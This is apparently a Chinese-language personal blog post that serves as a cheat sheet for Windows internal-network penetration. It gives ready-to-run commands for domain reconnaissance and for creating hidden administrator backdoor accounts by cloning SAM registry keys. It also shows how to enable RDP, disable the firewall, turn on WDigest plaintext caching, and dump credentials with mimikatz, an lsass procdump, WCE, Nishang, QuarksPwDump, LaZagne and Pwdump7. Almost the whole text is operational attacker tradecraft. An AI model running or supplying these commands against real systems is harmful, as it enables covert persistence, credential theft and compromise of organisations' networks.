---
title: 学习总结篇—Windows
date: 2019-11-20 00:20:02
author: dylan
top: false
cover: false
summary: 学习总结篇—Windows
password: 9f77c4517ffa5375fb7f06c0209facae53fd5e4b7b88986eb0c11591810b2dbe
categories: summary
tags: 
    - Windows
    - summary
---
# 0x00 前言

Windows内网渗透总结。

# 0x01 常用命令
```
dir
mkdir
rd
rd /s D:\test   删除D盘里的test文件夹  会出现如下 test, 是否确认(Y/N)?  直接输入 Y 在回车
rd test/s       删除此文件夹下的所有文件  test, 是否确认(Y/N)?  直接输入 Y 在回车

cd .>1.txt   创建1.txt  空文件
cd >1.txt  创建1.txt  文件内包含当前路径
type nul>1.txt  创建空文件
echo 123>1.txt
del 1.txt

more 1.txt  查看文件内容

netstat -ano | findstr 8080  根据端口找进程
tasklist | findstr 进程号
tasklist /svc  显示每个进程中的服务信息，当/fo参数设置为table时有效。
taskkill /pid 进程号

query user || qwinsta 查看当前在线用户
Lusrmgr.msc  用户和组管理图形界面
net user  查看本机用户
net user /domain 查看域用户
net view & net group "domain computers" /domain 查看当前域计算机列表 第二个查的更多
net view /domain 查看有几个域
net view \\\\dc   查看 dc 域内共享文件
net group /domain 查看域里面的组
net group "domain admins" /domain 查看域管
net localgroup administrators /domain   /这个也是查域管，是升级为域控时，本地账户也成为域管
net group "domain controllers" /domain 域控
net time /domain 
net config workstation   当前登录域 - 计算机名 - 用户名
net use \\\\域控(如pc.xx.com) password /user:xxx.com\username 相当于这个帐号登录域内主机，可访问资源
ipconfig
systeminfo
tasklist /svc
tasklist /S ip /U domain\username /P /V 查看远程计算机 tasklist
net localgroup administrators && whoami 查看当前是不是属于管理组
netstat -ano
nltest /dclist:xx  查看域控
whoami /all 查看 Mandatory Label uac 级别和 sid 号
net sessoin 查看远程连接 session (需要管理权限)
net share     共享目录
cmdkey /l   查看保存登陆凭证
echo %logonserver%  查看登陆域
spn –l administrator spn 记录
set  环境变量
dsquery server - 查找目录中的 AD DC/LDS 实例
dsquery user - 查找目录中的用户
dsquery computer 查询所有计算机名称 windows 2003
dir /s *.exe 查找指定目录下及子目录下没隐藏文件
arp -a
```

# 0x02 新建用户
## 基本命令

```
net user temp temp2005 /add
net localgroup administrators temp /add
```

system权限3389无法添加的用户情况:
[解决system权限3389无法添加的用户情况](http://www.91ri.org/5866.html)



## 常见的账户隐藏手法
### 命令行隐藏手法

优点：简单、快捷、不需要花里胡哨的东西。一条命令搞定。
缺点：只限于不被cmd命令行模式发现用户，容易被稍有经验的人发现

`net user 用户名$ /add`

### 注册表隐藏手法

优点：不易被发现。
缺点：注册表可见。

* 修改权限

默认注册表`HKEY_LOCAL_MACHINE\SAM\SAM\`只有`system`权限才能修改
现在需要为其添加管理员权限
右键-权限-选中`Administrators`，允许完全控制
重新启动注册表`regedit.exe`，获得对该键值的修改权限

* 新建特殊账户

```
net user test$ 123456 /add
net localgroup administrators test$ /add
```

* 导出注册表

在注册表`HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names`下找到新建的帐户`test$`
获取默认类型为`0x3ea`

将注册表`HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\test$`导出为`1.reg`

在注册表下能够找到`对应类型名称`的注册表项

`HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000003EA`

右键将该键导出为`2.reg`，保存的文件信息如下图

默认情况下，管理员帐户`Administrator`对应的注册表键值为
`HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4`

同样，右键将该键导出为`3.reg`

将注册表项`HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000003EA`下键`F`的值替换为
`HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4`下键`F`的值
即`2.reg`中键F的值替换成`3.reg`中键`F`的值

```
net user test$ /del
regedit /s 1.reg
regedit /s 2.reg
```

隐藏账户制做完成，控制面板不存在帐户`test$`
通过`net user`无法列出该帐户
计算机管理-本地用户和组-用户也无法列出该帐户

但可通过如下方式查看：

`net user test$`

无法通过`net user test$ /del`删除该用户，
提示用户不属于此组
删除方法：
删除注册表`HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\ `下对应帐户的键值**(共有两处)**


# 0x03 开启rdp端口

查询系统是否允许3389远程连接,1表示关闭，0表示开启

`REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections`

查看远程连接的端口,端口格式为16进制

`REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber`

开启远程桌面

```
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 00000000 /f

REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 0x00000d3d /f
```

如果端口被更改

`tasklist /svc`。
查看svchost有不有termservice服务,有的话记住pid
然后`netstat -ano`找到pid对应的端口就行了


如果系统未配置过远程桌面服务，第一次开启时还需要添加防火墙规则，允许 3389 端口，命令如下:
```
netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow
```

关闭防火墙

`netsh firewall set opmode mode=disable`


# 0x04 抓取管理员密码
## 1、mimikatz_trunk工具
### mimikatz_trunk工具抓取密码

```
privilege::debug    # 提升权限
sekurlsa::logonpasswords   #获取密码
```

### 抓取密码为空

当系统为**win10**或**2012R2**以上时，默认在内存缓存中禁止保存明文密码，
此时可以通过修改注册表的方式抓取明文，但需要用户**重新登录**后才能成功抓取。

```
reg add hklm\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
```

当我们不需要存储明文密码的时候，我们可以将上述命令中的`REG_DWORD`的值修改为`0`即可。

### 导出sam的Hash
还可以利用mimikatz在线导出sam的Hash

```
log res.txt
privilege::debug
token::elevate
lsadump::sam
```
当我们获取到hash值后，我们通过破解hash值来获取明密码，
用hashcat直接跑，字典越大跑出来的几率就越大；


### 配合Procdump抓取密码

首先我们先用procdum这款工具下载lsass进程的内存，
这个工具一般不会被AV查杀的，这款工具也分为32位和64位两个版本。

执行下载lsass进程内存的命令

`procdump64.exe -accepteula -ma lsass.exe` 

执行完毕后，在当前目录下会生成一个`lsass.dmp`的文件，这个文件是我们需要的文件：

将这个文件放在mimikatz目录下，然后启动mimikatz.exe，
执行`sekurlsa::minidump lsass.exe_190310_001506.dmp`

执行读取密码的命令

`sekurlsa::tspkg`


## 2、WCE
### 简介

这款工具是一款Hash注入神器，不仅可以用于Hash注入，也可以直接获取明文或Hash。
这款工具也分为32位和64位两个不同的版本
```
参数解释:

-l 列出登录的会话和NTLM凭据（默认值）；

-s 修改当前登录会话的NTLM凭据 参数：<用户名>:<域名>:<LM哈希>:<NT哈希>；

-r 不定期的列出登录的会话和NTLM凭据，如果找到新的会话，那么每5秒重新列出一次；

-c 用一个特殊的NTML凭据运行一个新的会话 参数：<cmd>；

-e 不定期的列出登录的会话和NTLM凭据，当产生一个登录事件的时候重新列出一次；

-o 保存所有的输出到一个文件 参数:<文件名>；

-i 指定一个LUID代替使用当前登录会话 参数:<luid>。

-d 从登录会话中删除NTLM凭据 参数:<luid>；

-a 使用地址 参数: <地址>；

-f 强制使用安全模式

-g 生成LM和NT的哈希 参数<密码>

-f 强制使用安全模式；希 参数<密码>；（unix和windows wce格式）；；；

-k 从一个文件中读取kerberos票据并插入到windows缓存中

-k 从一个文件中读取kerberos票据并插入到windows缓存中；

-v 详细输出；
```

### 使用

抓取用户的明文密码

`Wce.exe -w`

抓取hash值

`wce.exe -l`

`wce.exe -w > hash.txt   #保存在txt文档`

## 2、Nishang
### 简介

[Nishang](https://github.com/samratashok/nishang)是一款针对PowerShell的渗透工具，
除了可以抓取密码还可以进行端口扫描、提权、密码爆破等功能，
这款工具依赖系统权限（有点小瑕疵）。

### 使用

Posershell既然是一个框架，那我们需要将nishang导入到这个框架当中，运行脚本需要一定的权限，
`powershell`默认的执行策略是`Restricted`，这个`Restricted`是不允许运行任何脚本的。
在`PowerShell`执行

`Get-ExecutionPolicy   #命令来查看默认的策略组`
`Set-ExecutionPolicy remotesigned    #将策略值改为remotesigned,这样我们就可以运行脚本`

下载的`nishang`，继续执行

```
Import-Module .\nishang\nishang.psm1   #导入
Get-PassHashes   # 抓取hash值
powershell –exec bypass –Command "& {Import-Module'C:\Windows\System32\WindowsPowerShell\v1.0\nishang\Gather\Invoke-Mimikatz.ps1';Invoke-Mimikatz}"
# 抓取明文密码
```

## 3、Quarks PwDump
### 简介
Quarks PwDump 是一款开放源代码的Windows用户凭据提取工具，
它可以抓取windows平台下多种类型的用户凭据，包括：本地帐户、域帐户、缓存的域帐户和Bitlocker。

QuarksPwDump.exe参数说明：

```
-dhl 导出本地哈希值

-dhdc导出内存中的域控哈希值

-dhd 导出域控哈希值，必须指定NTDS文件

-db 导出Bitlocker信息，必须指定NTDS文件

-nt 导出ntds文件

-hist 导出历史信息，可选项

-t 导出类型可选默认导出为John类型。

-o 导出文件到本地
```

### 使用

执行抓取用户密码的命令

`quarksPwDump.exe --dump-hash-local -o hash.txt`

我们将抓取到的本地用户的密码保存到本地目录下的hash.txt中,保存的位置以及文件名自己可以设置:

## 4、LaZagne
### 简介
LaZagne是一款用于检索大量存储在本地计算机密码的开源应用程序。
该工具通过python开发，易读、易维护，依赖的python2版本,
这款工具不仅能抓取用户密码，还可以抓取浏览器中的缓存的密码、SVN密码、
wifi密码、邮箱密码等功能，这款工具不经适用于windows，也可以适用于Linux、MAC。

[本地密码查看工具LaZagne中的自定义脚本开发](https://www.4hou.com/tools/7404.html)

### 使用


`lazagne.exe windows`



## 5、Getpass
### 简介
这款工具由闪电小子根据mimikatz编译的一个工具，
双击运行或者在cmd运行可以直接获取明文密码，有的时候需要自己做免杀处理。


## 6、Pwdump7
### 简介

Pwdump 7是一个免费的Windows实用程序，它能够提取出Windows系统中的口令，并存储在指定的文件中。
Pwdump7是Pwdump3e的改进版，该程序能够从Windows目标中提取出NTLM和LanMan口令散列值，
而不管是否启用了Syskey（这是一个Windows账户数据库加密工具，是Windows下的一条命令）。

### 使用

这款工具使用比较方便，直接在`dos`命令中执行`pwdump7.exe`，就可以直接抓取密码，
如不愿意输出到桌面，可以执行

`pwdump7.exe > hash.txt`

# 0x05 打扫战场


# 参考文章

[详解Windows隐藏账户的常规手法及原理](https://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650456541&idx=3&sn=f7543b13db64961c6f947a2327c58254)
[渗透技巧——Windows系统的帐户隐藏](https://3gstudent.github.io/3gstudent.github.io/渗透技巧-Windows系统的帐户隐藏/)
[史上最强内网渗透知识点总结](https://blog.csdn.net/qq_33020901/article/details/80547964)

